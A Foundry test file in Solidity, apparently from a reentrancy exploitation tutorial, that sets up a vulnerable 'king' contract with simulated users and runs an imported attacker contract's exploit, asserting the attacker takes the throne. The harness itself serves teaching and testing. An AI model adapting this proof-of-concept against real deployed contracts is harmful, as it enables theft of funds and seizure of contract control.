// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/04_1-subtraction.sol";
import "../src/04_1-template_attacker.sol";

contract ProofOfConcept is Test {

    Vulnerable public victim;
    Attacker public attacker;

    // The setUp() function will be run before each test to set the initial scenario
    function setUp() public {
        // Declaring our contracts
        victim = new Vulnerable();
        attacker = new Attacker(address(victim));
        address alice = address(0x0);
        address bob = address(0x1);
        address charles = address(0x2);

        // Labelling for test traces
        vm.label(address(victim), "victim_contract");         
        vm.label(address(attacker), "attacker_contract");
        vm.label(alice, "alice");
        vm.label(bob, "bob");
        vm.label(charles, "charles");

        // Funding both parties
        vm.deal(address(attacker), 1 ether); // It is not necessary to fund the attacker as you could just send eth along, but still
        vm.deal(alice, 1 ether);
        vm.deal(bob, 2 ether);
        vm.deal(charles, 3 ether);   

        // Simulare legitimate users's usage
        vm.prank(alice);
        victim.deposit{value: 1 ether}();
        vm.prank(alice);
        victim.claimKing();
        console.log("[>] Alice is the Queen");
        vm.prank(bob);
        victim.deposit{value: 2 ether}();
        vm.prank(bob);
        victim.claimKing();
        console.log("[>] Bob is the king");
        vm.prank(charles);
        victim.deposit{value: 3 ether}();
        vm.prank(charles);
        victim.claimKing();
        console.log("[>] Charles is the King");         
    }

    // Foundry tests should start with the word "test" to be recognized as such
    function test_exploit() public {
        console.log(unicode"\n   📚📚 All things reentrancy: (not so) basic exploitation\n");
        console.log("--------------------------------------------------------");
        console.log(unicode"| => Victim's balance 🙂 %s 🙂", toEth(address(victim).balance));
        console.log(unicode"| => Attacker balance 👀 %s 👀", toEth(address(attacker).balance));  
        console.log(unicode"| => Current King 👀 %s 👀", victim.whoIsTheKing().addr);
        console.log("--------------------------------------------------------"); 

        console.log(unicode"\n\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n"); 

        attacker.exploit();

        // Conditions to fullfill
        assertEq(victim.whoIsTheKing().addr, address(attacker));

        console.log("--------------------------------------------------------"); 
        console.log(unicode"| => Victim's balance 👀 %s 👀", toEth(address(victim).balance));
        console.log(unicode"| => Attacker balance 💯 %s 💯", 
            toEth( address(attacker).balance + victim.userBalance(address(attacker)) )
        );    
        console.log(unicode"| => Current King 💯 %s 💯", victim.whoIsTheKing().addr);    
        console.log("--------------------------------------------------------");               
    }


    function toEth(uint256 _wei) internal pure returns (string memory) {
        string memory eth = vm.toString(_wei / 1 ether);
        string memory decs = vm.toString(_wei % 1 ether);

        if ((bytes(decs).length < 17) && (_wei%1 ether != 0)) {
            uint256 n_zeros = 17 - bytes(decs).length;
            for (uint i = 0; i < n_zeros; i++) {
                decs = string.concat("0", decs);
            }
        }

        string memory result = string.concat(
            string.concat(eth, "."),
            decs
        );

        return result;
    }      
}
